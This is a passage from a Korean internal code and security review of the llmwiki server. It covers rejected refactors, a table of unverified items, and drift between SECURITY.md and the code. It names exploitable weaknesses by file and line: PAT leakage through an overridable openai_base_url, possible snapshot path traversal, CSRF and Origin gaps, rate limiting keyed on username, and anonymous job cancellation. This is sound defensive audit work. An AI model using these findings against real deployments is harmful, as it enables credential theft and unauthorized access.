  30명 × SSE 연결 = 30개 스레드가 **영구 점유**된다. 지금 문제(스레드 무제한)를 악화시킨다.
- 브라우저의 호스트당 연결 6개 제한(`server.py:357-361` 주석이 이미 이 문제를 겪었다고 적고 있다)에
  SSE 연결이 하나를 영구히 먹는다.
- `/api/activity` 부하의 본질은 전송 방식이 아니라 **`RequestManager._lock` 경쟁과 `store.stats()` 의 COUNT** 다
  (§5.1). 캐시와 속도 제한으로 훨씬 싸게 해결된다.

**대신 할 것**: P1-1(속도 제한 + stats 캐시). 그리고 이미 되어 있는 것을 유지 —
`core.js:1191-1215` 의 주석이 "예전에는 네 화면이 각자 2초마다 불렀다 → 하나로 합쳤다" 고 적고 있다. 그 방향이 맞다.

### 7.4 ❌ 설정을 DB 로 옮기기

"config.json·tuning.json·security.json·server.json·docacl.json… 파일이 너무 많다. DB 한 곳에 모으자."

**절대 안 된다.** 파일 기반은 이 프로젝트의 **요구사항**이다 (메모리: "설정은 파일에 살아야 하고,
코드 변경 없이 환경을 옮길 수 있어야 한다"). 구체적으로:

- 사내 반입 절차에서 **DB 파일은 검토 대상이 아니고 텍스트 설정 파일은 검토 가능하다**.
- 배포 스크립트가 `config.json` 을 `sed` 로 고치는 것이 정상 운영이다(`server.py:1696-1697` 주석이
  "서버 밖에서 고쳤을 때" 를 명시적으로 지원한다).
- `tuning.py:464-478` 의 `_explicit_defaults` 는 **파일이 문서 역할을 하도록** 설계된 것이다. DB 로 가면 사라진다.

**대신 할 것**: 파일 수가 문제라면 `config paths` 와 `CONFIG_REFERENCE.md` 의 색인을 보강한다.

### 7.5 ❌ `doc_acl` 을 검색 아래(SQL WHERE)로 내리기

"부스트 뒤에 거르는 대신 `chunks_fts MATCH … AND doc_id NOT IN (가려진 문서)` 로 내리면 빠르고 확실하다."

매력적이지만 여기서는 **얻는 것보다 잃는 것이 크다**.

- `query_engine.py:1170-1173` 의 주석이 왜 그 자리인지 설명한다: 융합·부스트 통계를 **원래 후보 기준으로**
  남겨 "무엇이 걸러졌나" 를 보이게 하기 위해서다. SQL 로 내리면 `acl_info.removed` 가 0이 되고,
  운영자는 "왜 근거가 적지" 의 답을 잃는다. 이 시스템의 정체성은 **관측 가능성**이다.
- 가려진 문서 목록은 규칙(prefix) + front matter 의 조합이라 SQL 로 표현하기 어렵다.
  `doc_id NOT IN (…)` 에 수천 개를 넣는 것은 더 느리다.
- 진짜 문제는 "어디서 거르나" 가 아니라 **"거르는 코드가 모든 경로에서 실행되나"**(§2.3, §2.4)다.
  자리를 옮겨도 그 문제는 남는다.

**대신 할 것**: P0-1(기본 거부) + P0-4(계약 테스트).

### 7.6 ❌ `cli._run_cmd`(982줄)를 명령별 파일로 쪼개기

"한 함수가 982줄이라니, 명령마다 모듈로 나누자."

나누는 것 자체는 좋지만 **지금 하면 안 된다**. 이유:

- `/api/cli` 가 이 함수를 그대로 재사용한다(`cli.py:2832` `run(argv, settings, pipe, gate=False)`).
  Web 콘솔과 CLI 가 **같은 코드 경로**라는 것이 세 창구 정합의 기반이다.
- 쪼개는 과정에서 `pipe` 가 있을 때와 없을 때의 분기(`cli.py:812-820`)를 옮기다 보면
  **§2.3 과 같은 종류의 누락**이 생긴다. 지금은 접근 제어 배선을 먼저 고쳐야 할 때다.
- 982줄이 읽기 어려운 것은 맞지만, argparse 디스패치는 **원래 평평하다**. 분할의 이득이 크지 않다.

**대신 할 것**: P0-1 을 먼저 한 뒤, 그때 `cli.py` 를 건드린다면 **명령별 함수 추출**(파일 분할이 아니라)
정도로 한정한다.

### 7.7 ❌ 캐시를 사용자별로 나누기

§2.5 의 해법으로 "`_cache_key` 에 `user.name` 을 넣자" 가 가장 먼저 떠오른다. **틀렸다.**

30명이 각자 다른 캐시를 가지면 적중률이 1/30 로 떨어지고, `query_cache_size`(200)에서는 사실상 0이 된다.
`answer_cache` 는 더 나빠서, 같은 질문을 30명이 물으면 LLM 을 30번 부른다 — 캐시를 켠 이유가 사라진다.

**대신 할 것**: **유효 가시 집합(effective visible set)** 을 키로 쓴다.
`docacl` 은 역할 6단계 × 규칙 집합이므로, 실제로 존재하는 "가시성 등급" 은 많아야 6개다.
`sig["acl"] = (rules_fingerprint, effective_rank)` 면 같은 등급끼리는 캐시를 공유하고 등급 간에는 격리된다.
적중률은 거의 그대로다.

### 7.8 ❌ 로깅/관측 코드를 걷어내 함수를 짧게 만들기

`query_engine.run` 이 462줄인 이유의 상당 부분이 `st.note`/`st.debug`/`prof.skipped` 다(§3.5).
"이걸 빼면 절반이 된다" 는 유혹이 있다.

**이 코드가 이 프로젝트의 제품이다.** `--trace`·Web 워터폴·`analyze`·`sweep`·`forensic` 이 전부
이 기록 위에 서 있다. 특히 `prof.skipped(단계, 이유)` 는 "왜 이 단계가 안 돌았나" 를 답하는 유일한 수단이고,
그것을 빼면 `ARCHITECTURE_V3 §5` 의 단계 표가 거짓말이 된다.

**대신 할 것**: 구조를 나누되(P2-1) 기록은 그대로 옮긴다. 그리고 §2.4(a) 의 교훈을 적용해서 —
**새 경로를 만들 때 `prof.skipped` 를 빠뜨리면 그것이 곧 결함**이다. 재생 경로가 `doc_acl` 을
`skipped` 로조차 기록하지 않은 것이 그 단계가 없다는 사실을 숨겼다.

---

## §8. 이 리뷰에서 확인하지 못한 것 (확인 필요)

정직하게 남긴다. 아래는 **읽지 못했거나 판단을 유보한** 항목이다.

| # | 무엇 | 왜 유보했나 |
|---|---|---|
| 1 | **§2.1(PAT 유출)의 실증** — `POST /mcp` 로 임의 `openai_base_url` 을 지정하고 그 주소에서 `Authorization` 헤더를 실제로 받아 보는 것 | 네 단계(`/mcp`=read → `apply_overrides` → `PROVIDER_SIG_KEYS` 재생성 → `auth_headers`)를 모두 코드로 확인했으나 아웃바운드 요청을 관측하지는 않았다. **배포 전 실증을 권한다** |
| 2 | 1만 문서 환경의 실측 — 엔티티 수, `mentions`/`relations` 행 수, `/api/status` 실제 지연 | §5 의 추정에 확신을 주려면 `python -m llmwiki stats --json` + 부하 스크립트가 필요 |
| 3 | `query_engine._retrieve` 의 `stop_after=="boost"` 분기에서 `inject` 가 `{}` 인 것(`:1227`)이 의도인지 누락인지 | 주석이 "주입도 하지 않는다"(`:1219`)고 적혀 있어 **의도로 보이지만**, 그렇다면 `rerank_before` 를 채우는 것(`:1228`)과 어긋난다 |
| 4 | `progress._LIVE` 의 `_KEEP_DONE_S` 정리가 실제로 도는지 | §4.3 표의 한 줄 |
| 5 | MCP stdio 전송(`python -m llmwiki mcp`)이 actor 를 설정하는지 | HTTP 전송은 확인했다(`server.py:573`). stdio 는 같은 PC 전제라 admin 이 맞을 수 있으나 **문서에 근거가 없다** |
| 6 | `llmwiki/scheduler.py`(737줄)·`sweep.py`(725줄)·`forensic.py`(637줄)·`headless.py`(676줄)·`mcp_client.py`(770줄) 의 본문 | 전수로 읽지 못했다. `scheduler.ACTION_TYPES`(`:34-35`)와 `run_now`(`:765`)만 §2.2 의 근거로 확인했다. 스케줄러의 자동 실행 경로에 §2.3 과 같은 actor 문제가 있을 가능성이 높다 — **우선 확인 대상** |
| 7 | `mcp.py` 의 **플러그인·페더레이션** 경로(`plugins/mcp_tools/*.py` 의 `register_tool`, `<source>__<tool>` 중계) | 감사 범위 밖이었다. 플러그인 도구도 `/mcp` = **read 등급 하나**로만 게이트되므로, **쓰기 동작을 하는 플러그인 도구가 있으면 viewer 가 쓸 수 있다**. 별도 점검 권장 |
| 8 | `snapshots.restore(pipe, name)` 의 `name` 경로 순회 가능성 (`snapshots.py:81`, `POST /api/snapshot` 본문에서 검증 없이 전달) | 대상 디렉터리에 DB 파일이 필요하고 builder 권한이 있어야 해 실현성은 낮아 보이나 실증하지 않았다 |
| 9 | `sweep.classify_key`/`sweepable_keys` 가 스윕 가능 키를 자체적으로 제한하는지 | `server.py:1603` 이 굳이 `_filter_overrides` 를 **추가로** 부르는 것으로 보아 자체 제한이 불충분한 듯하나 미확증 |
| 10 | `verify_click.py` 가 `verify_buttons.py` 로 완전히 대체된 것인지 | 두 파일 전체 대조를 하지 않았다. `verify_click.py` 는 `verify_all.SUITES` 에 아예 등록돼 있지 않다 |

> 처음 유보했던 두 항목(`auth.py` 전수 검토 · `verify_all.py` 구성)은 이 리뷰 안에서 해소해
> 각각 §2.1·§2.2·§2.6·§2.12 와 §4.4 로 본문에 넣었다.

---

## §9. 관련 문서

- [ARCHITECTURE_V3.md](../2026-09-15/ARCHITECTURE_V3.md) — 전체 구조. §5 의 단계 표는 코드와 일치함을 확인했다
- [CONCURRENCY.md](../../CONCURRENCY.md) — §3 의 요청 흐름도는 **GET 에 대해 사실이 아니다** (§2.7). §9 의 메모리 누수 진단표가 원인을 하나만 지목한다 (§2.9)
- [SECURITY.md](../../SECURITY.md) — §6.2 의 "네 출구" 목록이 불완전하고(§2.3~2.6, §2.8), §6.1 이 막았다는 overrides 구멍이 MCP 에 남아 있으며(§2.1), §7 이 감사 로그의 truncate·무결성을 언급하지 않는다(§2.12). 그 밖의 문서↔코드 드리프트도 여러 건이다 — 아래
- [QA_HARDENING_0919.md](QA_HARDENING_0919.md) — 이 리뷰는 그 §8("남은 것")에 없는 축을 찾은 것이다. 다만 §6 의 테스트 매핑이 **배선이 아니라 함수를 검증한다** (§4.0)
- [DEEP_REVIEW_0919.md](DEEP_REVIEW_0919.md) — 성능·토큰·프로파일. §8 의 우선순위는 여전히 유효하다. 단위 테스트 수(343)는 낡았다 (§2.16)
- [CODE_REVIEW_0917.md](../2026-09-17/CODE_REVIEW_0917.md) — 일부 항목이 낡았다 (§2.15). §0 P0-1 은 **Web 에서만** 고쳐졌다 (§2.1)
- [RERUN.md](../../RERUN.md) — §2.4 의 대상

### 9.1 SECURITY.md 의 개별 드리프트 (위 §2 에 본문으로 다루지 않은 것)

| # | 문서 | 실제 |
|---|---|---|
| D-1 | §2.1 `class1` 행이 "`build --channels …`" 을 index 로 적는다 | 코드는 rebuild(builder) — `auth.py:371-372`. 같은 문서의 §2.2 rebuild 행은 제대로 적혀 있다. **문서 내부 자기모순** |
| D-2 | §6 "복원 직전에도 자동 스냅샷을 남기므로 **복원 자체도 되돌릴 수 있다**" | CLI 만 만든다(`cli.py:2404`). **Web `POST /api/snapshot {action:"restore"}` 는 만들지 않는다**(`server.py:1427-1428` → `snapshots.py:80-86`) |
| D-3 | §2.2 destructive 행 "확인 + 문구 + 비밀번호 + **스냅샷**" | 자동 스냅샷은 `reset_index` 에서만(`pipeline.py:428-432`). `maintenance purge_requests`(destructive)는 스냅샷 없음(`server.py:1731`). 또 **비밀번호 재입력은 `user.via == "local"` 일 때만**(`auth.py:895`) — API 키·SSO·mode=off 는 문구만으로 통과한다 |
| D-4 | §3 "CSRF: **모든 API 호출에** `X-Requested-With` + Origin 검사" | `/api/auth/login|logout|password` 는 `authorize()` **앞에서** 반환하고(`server.py:1240/1254/1268`), 모든 `DELETE` 는 `authorize()` 를 아예 부르지 않는다(`server.py:601-618`). 헤더 요구는 `mode == "on"` 일 때만(`auth.py:917`)이라 루프백 기본 구성에서는 꺼진다. Origin 비교 대상은 허용 목록이 아니라 **클라이언트가 보낸 Host** 이고, `localhost`·`127.0.0.1` 은 서버 host 와 무관하게 **항상 허용**된다(`auth.py:915`) |
| D-5 | §9 "개별 세션을 서버에서 지우는 목록이 없다" | 있다 — `SessionRegistry`(`auth.py:941-1029`) + 강제 로그아웃(`revoke_user`, `:1015`) + 동시 세션 제한. 기본 `enforce=False`. **문서가 뒤처졌다** |
| D-6 | §3 "무차별 대입: 0.5s 지연 + 감사 로그. IP 차단은 프록시에 맡긴다" | 내장 rate limit 도 있다(`reqmgr.py:64-70`, 로그인이 `mgr.ticket` 을 탄다). 다만 `_client_key`(`reqmgr.py:502-507`)가 **공격자가 제어하는 username** 으로 키를 만들어 `per_user_per_min` 은 무력하고, 실효 방어는 `per_ip_per_min=120` 뿐이다 |
| D-7 | §10 표가 `auth.py:482 PUBLIC_PATHS` 를 공개 경로 정의로 읽히게 한다 | **참조 0건의 데드 코드**. 실제 공개 경로는 `server.py:676-695` 에 하드코딩 |
| D-8 | §2.2 등급표 | `/api/collab` 전체(익명 쓰기 가능) · `/api/sweep` · `/api/debug/query` · `/api/profile` · `/api/auth/preview` 등급이 표에 없다 |

`DELETE /api/jobs/<id>` 에는 부수 문제가 하나 더 있다: 익명 게스트는 전원 `user.name == "guest"`(`auth.py:867`)이므로
`allow_owner=user.name`(`server.py:614`) 검사를 서로 통과한다 → **익명 A 가 익명 B 의 실행 중 작업을 취소할 수 있다.**
